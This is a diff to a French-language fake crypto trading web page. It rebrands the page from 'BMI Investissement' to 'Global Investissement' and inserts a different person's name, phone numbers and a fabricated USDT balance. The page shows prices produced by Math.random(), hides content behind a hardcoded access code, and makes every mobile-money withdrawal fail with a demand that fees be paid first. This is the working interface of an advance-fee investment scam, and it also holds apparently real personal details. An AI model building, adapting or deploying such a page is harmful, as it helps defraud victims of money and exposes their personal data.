@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interface de Trading Crypto - BMI Investissement</title>
+    <title>Interface de Trading Crypto - Global Investissement</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -230,7 +230,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "2121") {
+        if (code === "2120") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -240,14 +240,14 @@
 
     <header>
         <div class="logo">
-            <h1>BMI Investissement</h1>
+            <h1>Global Investissement</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 4 876,98 EUR</span>
+                <span class="balance">Solde: 32 101,000 USDT</span>
                 <div class="account-info">
-                    <span>DIALLO ALPHA AMADOU DIOULDÉ</span><br>
-                    <span>610468985</span>
+                    <span>ANTSOULOU MAGLOIRE</span><br>
+                    <span>24177147833</span>
                 </div>
                 <button>Déconnexion</button>
             </div>
@@ -274,22 +274,19 @@
                 </div>
             </div>
             <div class="withdrawal-options">
-                <button id="orange-money">Retrait via Orange Money</button>
+                <button id="airtel">Retrait via Airtel Money</button>
+                <button id="moov">Retrait via Moov Money</button>
             </div>
             <div class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
-                <div class="info">
-                    <p>Nom: DIALLO ALPHA AMADOU DIOULDÉ</p>
-                    <p>Numéro: 610468985</p>
-                    <p>Montant: 4 876,98 EUR</p>
-                </div>
+                <div class="info" id="withdrawal-info"></div>
                 <button id="confirm-withdrawal">Valider le Retrait</button>
             </div>
             <div class="error-message" id="error-message"></div>
         </div>
     </main>
     <footer>
-        <p>© 2024 BMI Investissement. Tous droits réservés.</p>
+        <p>© 2024 Global Investissement. Tous droits réservés.</p>
     </footer>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
@@ -297,6 +294,7 @@
             const variationElement = document.querySelector('.price-info .variation');
             const errorMessage = document.getElementById('error-message');
             const withdrawalForm = document.getElementById('withdrawal-form');
+            const withdrawalInfo = document.getElementById('withdrawal-info');
 
             const updatePrice = () => {
                 const newPrice = (Math.random() * (70000 - 65000) + 65000).toFixed(2);
@@ -308,13 +306,23 @@
 
             setInterval(updatePrice, 5000);
 
-            document.getElementById('orange-money').addEventListener('click', () => {
+            const showWithdrawalForm = (method) => {
+                let withdrawalDetails = `<p>Nom: ANTSOULOU MAGLOIRE</p><p>Numéro: 24177147833</p><p>Montant: 32 101,000 USDT</p>`;
+                if (method === 'Airtel Money') {
+                    withdrawalDetails = `<p>Nom: ANTSOULOU MAGLOIRE</p><p>Numéro: 24177147833</p><p>Montant: 32 101,000 USDT</p>`;
+                } else if (method === 'Moov Money') {
+                    withdrawalDetails = `<p>Nom: ANTSOULOU MAGLOIRE</p><p>Numéro: 24174509691</p><p>Montant: 32 101,000 USDT</p>`;
+                }
+                withdrawalInfo.innerHTML = withdrawalDetails;
                 withdrawalForm.style.display = 'flex';
                 errorMessage.textContent = '';
-            });
+            };
+
+            document.getElementById('airtel').addEventListener('click', () => showWithdrawalForm('Airtel Money'));
+            document.getElementById('moov').addEventListener('click', () => showWithdrawalForm('Moov Money'));
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                errorMessage.textContent = 'Erreur : Veuillez régler vos frais de 850 Euro auprès de BMI Investissement pour entrer en possession de vos bénéfices.';
+                errorMessage.textContent = 'Erreur : Veuillez régler vos frais aupres de Global investissement pour entrer en possession de vos bénéfices.';
                 withdrawalForm.style.display = 'none';
             });
 
